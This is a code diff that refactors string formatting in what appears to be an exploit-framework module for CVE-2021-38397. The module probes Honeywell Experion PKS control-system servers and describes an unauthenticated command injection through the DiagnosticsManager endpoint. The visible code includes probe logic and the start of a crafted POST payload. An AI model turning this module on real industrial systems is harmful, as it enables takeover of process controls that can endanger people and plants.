@@ -52,11 +52,11 @@ _INJECTION_ENDPOINT = "/ExperionAPI/api/DiagnosticsManager"
 def _http_get(target: str, port: int, path: str, timeout: int) -> tuple:
     """Perform a minimal raw HTTP GET and return (status_code, body_bytes)."""
     request = (
-        "GET {} HTTP/1.0\r\n"
-        "Host: {}:{}\r\n"
+        f"GET {path} HTTP/1.0\r\n"
+        f"Host: {target}:{port}\r\n"
         "Connection: close\r\n"
         "\r\n"
-    ).format(path, target, port).encode()
+    ).encode()
 
     try:
         sock = socket.create_connection((target, port), timeout=timeout)
@@ -151,14 +151,12 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would probe {}:{} for Honeywell Experion PKS web API, then send "
+                    f"Would probe {self.target}:{self.port} for Honeywell Experion PKS web API, then send "
                     "a crafted POST request to the DiagnosticsManager endpoint with "
                     "an OS command injection payload embedded in the JSON body. "
                     "CVE-2021-38397 (CVSS 10.0) — no authentication required. "
                     "Expected result: OS command execution as SYSTEM on the DCS server. "
-                    "DCS compromise enables control of all Honeywell-managed processes.".format(
-                        self.target, self.port
-                    )
+                    "DCS compromise enables control of all Honeywell-managed processes."
                 ),
                 payload_hex=(
                     'POST /ExperionAPI/api/DiagnosticsManager HTTP/1.0\\r\\n'
@@ -173,18 +171,14 @@ class Exploit(Exploit):
             )
             return
 
-        print_status("[CVE-2021-38397] Checking Experion PKS web API on {}:{}...".format(
-            self.target, self.port
-        ))
+        print_status(f"[CVE-2021-38397] Checking Experion PKS web API on {self.target}:{self.port}...")
         active_port, code, body = _check_experion_web(self.target, self.port, self.timeout)
 
         if code == 200:
-            print_success("[CVE-2021-38397] Experion API responded HTTP 200 on port {}.".format(
-                active_port
-            ))
+            print_success(f"[CVE-2021-38397] Experion API responded HTTP 200 on port {active_port}.")
             preview = body[:300].decode("utf-8", errors="replace").strip()
             if preview:
-                print_info("[CVE-2021-38397] API response: {}".format(preview[:200]))
+                print_info(f"[CVE-2021-38397] API response: {preview[:200]}")
             print_warning(
                 "[CVE-2021-38397] Version endpoint accessible. Check if "
                 "DiagnosticsManager endpoint allows unauthenticated POST (CVE-2021-38397)."
@@ -198,5 +192,5 @@ class Exploit(Exploit):
             )
         else:
             print_error(
-                "[CVE-2021-38397] No Experion PKS web API detected (code={}).".format(code)
+                f"[CVE-2021-38397] No Experion PKS web API detected (code={code})."
             )
